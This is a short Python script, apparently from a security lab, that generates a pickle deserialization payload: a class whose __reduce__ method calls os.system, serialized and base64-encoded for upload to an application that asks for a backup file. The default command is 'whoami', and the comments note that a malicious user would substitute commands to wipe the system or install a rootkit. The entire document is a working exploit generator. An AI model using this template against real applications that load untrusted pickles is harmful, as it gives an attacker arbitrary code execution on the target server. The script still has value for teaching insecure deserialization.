# This script generates a payload that can be uploaded to the application when it asks for a backup file.
# The default payload is harmless. It only prints the account used to run the application.
# In real life a malicious user would probably wipe out the system or install a rootkit.

import pickle
import os
import base64

class generate_payload(object):
	def __reduce__(self):
		return (os.system, ("whoami", ))

pickle_data = pickle.dumps(generate_payload())
with open("pickle_payload_sample.txt", "wb") as file:
	file.write(base64.b64encode(pickle_data))
